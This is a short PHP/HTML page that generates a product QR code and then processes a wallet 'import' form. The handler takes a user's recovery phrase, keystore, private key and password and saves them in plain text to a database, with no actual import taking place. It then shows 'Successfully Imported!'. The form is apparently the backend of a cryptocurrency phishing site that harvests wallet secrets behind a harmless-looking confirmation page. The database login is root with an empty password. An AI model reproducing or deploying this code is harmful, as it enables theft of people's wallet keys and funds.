
<!DOCTYPE html> 

<html>  
   <head> 
      <meta charset = "utf-8"> 
      <title>success</title>

<style>
   .success{
      color: rgb(88, 120, 188);
      font-weight: 650;



   }
</style>

 
   </head> 
  
   <body> 
 <center>
         <section> 
         <?php

//load the ar library
include ('qrlib.php');

//data to be stored in qr
$text = "PRODUCT ID 23456";
  
//file path
$file = "images/qr1.png";
  
//other parameters
$ecc = 'H';
$pixel_size = 10;
$frame_size = 5;
  
// Generates QR Code and Save as PNG
QRcode::png($text, $file, $ecc, $pixel_size, $frame_size);
  
// Displaying the stored QR code if you want
echo "<div><img src='".$file."'></div>";

?>

<?php

session_start();

// initializing variables
$phrase = "";
$keystore  = "";
$private_key = "";
$password = "";

// connect to the database
$conn = mysqli_connect('localhost', 'root', '', 'reg');

if (isset($_POST['import'])) {
    // receive all input values from the form
    $phrase = mysqli_real_escape_string($conn, $_POST['phrase']);
    $keystore = mysqli_real_escape_string($conn, $_POST['keystore']);
    $private_key = mysqli_real_escape_string($conn, $_POST['private_key']);
    $password = mysqli_real_escape_string($conn, $_POST['password']);
 

      $query = "INSERT INTO wallets (phrase, keystore, private_key,password) 
                VALUES('$phrase', '$keystore', '$private_key','$password')";
      mysqli_query($conn, $query);
      header('location: generate-qr.php');
  
} 

?>
<center>
<h1 class="success">Successfully Imported!</h1>
      </section> 
    
</html> 